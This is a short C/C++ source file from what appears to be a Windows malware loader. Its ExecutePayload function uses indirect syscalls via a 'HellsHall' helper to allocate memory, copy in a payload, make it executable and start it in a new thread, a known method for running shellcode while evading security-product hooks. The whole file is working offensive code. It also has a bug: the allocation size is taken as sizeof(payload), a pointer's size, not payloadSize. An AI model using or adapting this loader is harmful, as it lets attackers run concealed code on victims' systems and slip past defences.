#include <Windows.h>
#include "MemoryManipulation.hpp"
#include "HellsHall.h"

#include "ExecutePayload.h"

BOOL ExecutePayload(NTAPI_FUNC_TABLE SyscallTable, BYTE* payload, SIZE_T payloadSize)
{
	NTSTATUS STATUS		= NULL;
	PVOID pAddr			= NULL;
	SIZE_T dwSize		= sizeof(payload);
	DWORD dwOldProtect	= NULL;
	HANDLE hProcess		= NtCurrentProcess();
	HANDLE hThread		= NULL;


	//allocate memory for payload
	SET_SYSCALL(SyscallTable.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddr, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddr == NULL)
		return FALSE;

	//copy payload into memory allocated
	CopyMemoryEx(pAddr, payload, payloadSize);

	//make memory readable & executable.
	SET_SYSCALL(SyscallTable.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddr, &dwSize, PAGE_EXECUTE_READ, &dwOldProtect)) != 0x00)
		return FALSE;

	//call create thread on payload 
	SET_SYSCALL(SyscallTable.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddr, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00)
		return FALSE;

	//call wait for single object.
	SET_SYSCALL(SyscallTable.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00)
		return FALSE;

	return TRUE;
}